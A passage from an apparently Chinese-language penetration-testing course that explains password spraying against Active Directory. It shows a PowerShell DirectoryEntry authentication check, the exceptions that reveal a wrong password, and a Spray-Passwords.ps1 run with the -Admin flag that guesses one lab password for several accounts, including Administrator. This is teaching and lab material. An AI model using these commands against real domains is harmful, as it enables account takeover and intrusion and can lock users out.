
`New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qerty09!")`

## 列表 696 - 使用 DirectoryEntry 进行身份验证

如果用户账户的密码正确，将如列表 697 所示成功创建对象。

| distinguishedName | (DC=corp,DC=com) |
| 路径 | `LDAP://DC1.corp.com/DC=corp,DC=com` |

## 列表 697 - 使用 DirectoryEntry 成功身份验证

如果密码无效，将不会创建任何对象，并且我们将如列表 698 所示收到一个异常。请注意关于用户名或密码错误的清晰警告。

```text
format-default : The following exception occurred while retrieving member "distinguishedName: "The user name or password is incorrect. "

+ * + Cargo : Notified: (:) [format-default], ExtendedSystemException

* + FullyQualifiedErrorCode : CatchFromBaseGetMember.Microsoft.PowerShell.Commands.Format-
```

## 列表 698 - 使用 DirectoryEntry 密码错误

通过这种方式，我们可以创建一个 PowerShell 脚本，根据锁定超时时间（`Lockout timeout`）和锁定观察窗口（`Lockout observation window`）枚举所有用户并进行身份验证。

一个名为 `Spray-Passwords.ps1`⁶⁶⁵ 的现有攻击实现位于 `C:\active_directory` 文件夹中，它允许我们设置单个密码进行测试，或者我们可以使用 `-Pass` 选项切换密码列表文件。我们还可以通过添加 `-Admin` 标志测试管理员账户。

⁶⁶⁵ (Improsec, 2016), https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1

```bash
PS C:\Tools\active_directory\Spray-Passwords.ps1 -Pass Qerty09! -Admin

WARNING: also targeting admin accounts.

Performing brute force - press q to stop the process and return results...

Guessed password for user: 'Administrator' = 'Qerty09!'

Guessed password for user: 'offsec' = 'Qerty09!'

Guessed password for user: 'adam' = 'Qerty09!'

Guessed password for user: 'is_service' = 'Qerty09!'

Guessed password for user: 'sql_service' = 'Qerty09!'

Stopping bruteforce now..

Users guessed:

'Administrator' with password: 'Qerty09!'

'offsec' with password: 'Qerty09!'

'adam' with password: 'Qerty09!'

'is_service' with password: 'Qerty09!'

'sql_service' with password: 'Qerty09!'
```
